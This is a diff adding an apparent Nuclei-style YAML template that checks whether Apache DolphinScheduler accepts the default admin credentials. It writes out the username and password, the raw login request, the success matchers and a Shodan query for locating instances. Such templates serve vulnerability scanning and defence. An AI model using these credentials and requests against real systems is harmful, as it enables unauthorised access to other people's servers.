@@ -1,0 +1,46 @@
+http:
+    - attack: pitchfork
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"msg":"login success"'
+            - '"sessionId":'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        pass:
+            - dolphinscheduler123
+        user:
+            - admin
+      raw:
+        - |
+          POST /dolphinscheduler/login HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          userName={{user}}&userPassword={{pass}}
+id: dolphinscheduler-default-login
+info:
+    author: For3stCo1d
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+        cvss-score: 8.3
+        cwe-id: CWE-522
+    description: Apache DolphinScheduler default admin credentials were discovered.
+    metadata:
+        max-request: 1
+        shodan-query: http.title:"DolphinScheduler"
+    name: Apache DolphinScheduler Default Login
+    reference:
+        - https://github.com/apache/dolphinscheduler
+    severity: high
+    tags:
+        - dolphinscheduler
+        - default-login
+        - oss
+        - DolphinScheduler
+        - dolphin
